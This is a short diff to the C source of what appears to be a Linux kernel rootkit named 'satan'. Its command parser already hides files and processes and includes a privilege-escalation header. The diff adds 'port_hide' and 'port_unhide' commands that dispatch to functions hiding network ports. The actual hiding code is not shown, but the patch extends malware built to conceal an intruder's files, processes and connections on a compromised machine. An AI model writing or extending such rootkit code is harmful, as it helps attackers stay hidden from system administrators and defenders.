@@ -6,6 +6,7 @@
 #include <linux/uaccess.h>
 
 #include "file.h"
+#include "port.h"
 #include "privesc.h"
 #include "proc.h"
 
@@ -15,6 +16,8 @@
 #define CMD_FILE_UNHIDE "file_unhide"
 #define CMD_PROC_HIDE   "proc_hide"
 #define CMD_PROC_UNHIDE "proc_unhide"
+#define CMD_PORT_HIDE   "port_hide"
+#define CMD_PORT_UNHIDE "port_unhide"
 
 
 #define CMD_RET_SUCCESS          0
@@ -77,6 +80,14 @@ int satan_command_parse(const char *s)
         } else if (!strncmp(cmd, CMD_PROC_UNHIDE, CMD_SIZE)) {
                 DIE_IF_NO_ARG(arg);
                 satan_proc_unhide(simple_strtoul(arg, NULL, 10));
+
+        } else if (!strncmp(cmd, CMD_PORT_HIDE, CMD_SIZE)) {
+                DIE_IF_NO_ARG(arg);
+                satan_port_hide(simple_strtoul(arg, NULL, 10));
+
+        } else if (!strncmp(cmd, CMD_PORT_UNHIDE, CMD_SIZE)) {
+                DIE_IF_NO_ARG(arg);
+                satan_port_unhide(simple_strtoul(arg, NULL, 10));
 
         } else {
                 pr_info("satan: unknown command: %s\n", cmd);
